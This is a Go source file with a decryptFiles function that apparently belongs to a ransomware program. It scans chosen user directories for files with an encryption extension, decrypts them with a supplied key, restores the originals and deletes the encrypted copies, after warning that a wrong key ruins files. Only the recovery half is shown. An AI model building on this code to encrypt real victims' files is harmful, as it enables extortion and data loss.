package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"

	"github.com/mauri870/cryptofile/crypto"
)

func decryptFiles(key string) {
	fmt.Println("Note: \nIf you are trying a wrong key your files will be decrypted with broken content irretrievably, please don't try keys randomly\nYou have been warned")
	fmt.Println("Continue? Y/N")

	var input string
	fmt.Scanf("%s", &input)

	if input != "Y" {
		os.Exit(2)
	}

	log.Println("Walking dirs and searching for encrypted files...")

	for _, f := range InterestingDirs {
		folder := BaseDir + f
		filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
			ext := filepath.Ext(path)
			if ext == EncryptionExtension {
				MatchedFiles = append(MatchedFiles, path)
				log.Println("Matched:", path)
			}
			return nil
		})
	}

	for _, path := range MatchedFiles {
		log.Printf("Decrypting %s...\n", path)
		ciphertext, _ := ioutil.ReadFile(path)

		text, err := crypto.Decrypt([]byte(key), ciphertext)
		if err != nil {
			log.Fatal(err)
		}

		ioutil.WriteFile(path[0:len(path)-len(filepath.Ext(path))], text, 0600)

		os.Remove(path)
	}

	if len(MatchedFiles) == 0 {
		log.Println("No encrypted files found")
	}
}
